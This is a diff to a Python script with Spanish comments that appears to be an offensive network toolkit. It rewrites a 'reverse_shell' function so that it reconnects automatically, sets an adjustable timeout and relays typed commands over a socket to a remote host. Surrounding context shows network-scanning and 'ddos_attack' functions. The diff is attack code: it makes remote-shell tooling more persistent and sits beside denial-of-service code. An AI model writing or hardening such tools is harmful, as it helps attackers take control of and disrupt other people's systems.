@@ -1,7 +1,8 @@
 # Módulos estándar
 import os
 import time
-import socket
+# Añade estos imports al inicio (junto con los otros):
+from socket import (socket, AF_INET, SOCK_STREAM, setdefaulttimeout, timeout as socket_timeout , gethostbyname, gaierror, error as socket_error)
 import subprocess
 import random
 import logging
@@ -212,37 +213,55 @@ def scan_network(ip_range: Optional[str] = None) -> List[Dict[str, str]]:
         logger.error(f"Error en escaneo de red: {str(e)}", exc_info=True)
         return []
 
-def reverse_shell(target_ip: str, port: int = 5000) -> None:
-    """Shell inverso con mejor manejo de conexión"""
+def reverse_shell(target_ip: str, port: int = 5000, timeout: int = 30) -> None:
+    """Shell inverso con manejo robusto de errores y reconexión."""
     if not validate_ip(target_ip):
         raise ValueError(f"IP inválida: {target_ip}")
-        
-    try:
-        setdefaulttimeout(DEFAULT_TIMEOUT)
-        with socket(AF_INET, SOCK_STREAM) as s:
-            s.connect((target_ip, port))
-            logger.info(f"Conexión establecida con {target_ip}:{port}")
-            
-            while True:
-                try:
-                    cmd = input("$ ")
-                    if not cmd or cmd.lower() in ('exit', 'quit'):
-                        break
+
+    setdefaulttimeout(timeout)  # Timeout ajustable
+
+    while True:
+        try:
+            with socket(AF_INET, SOCK_STREAM) as s:
+                logger.info(f"Conectando a {target_ip}:{port}...")
+                s.connect((target_ip, port))
+                logger.info(f"Conexión establecida. Timeout: {timeout}s")
+
+                while True:
+                    try:
+                        cmd = input("$ ").strip()
+                        if cmd.lower() in ('exit', 'quit'):
+                            return
+
+                        s.sendall(cmd.encode() + b'\n')
                         
-                    s.sendall(cmd.encode() + b'\n')
-                    response = s.recv(4096).decode('utf-8', errors='ignore')
-                    print(response)
-                    
-                except KeyboardInterrupt:
-                    logger.info("Cerrando conexión...")
-                    break
-                except Exception as e:
-                    logger.error(f"Error en comando: {str(e)}")
-                    break
-                    
-    except Exception as e:
-        logger.error(f"Error en shell inverso: {str(e)}", exc_info=True)
-        raise
+                        # Espera datos con timeout
+                        response = s.recv(4096).decode('utf-8', errors='ignore')
+                        if not response:
+                            logger.warning("Conexión cerrada por el host remoto")
+                            break
+                        print(response)
+
+                    except socket_timeout:  # ¡Ahora está definido!
+                        logger.warning(f"Timeout: no hay respuesta en {timeout}s")
+                        continue
+                    except KeyboardInterrupt:
+                        logger.info("\nSesión finalizada por el usuario")
+                        return
+                    except Exception as e:
+                        logger.error(f"Error en comando: {str(e)}")
+                        break
+
+        except ConnectionRefusedError:
+            logger.error(f"No se pudo conectar a {target_ip}:{port}. ¿Servicio activo?")
+        except socket_error as e:
+            logger.error(f"Error de socket: {str(e)}")
+        except Exception as e:
+            logger.critical(f"Error crítico: {str(e)}")
+        
+        # Reconexión automática después de 5 segundos
+        logger.info("Reintentando en 5 segundos...")
+        time.sleep(5)
 
 def ddos_attack(target_ip, port, duration):
     start_time = time.time()
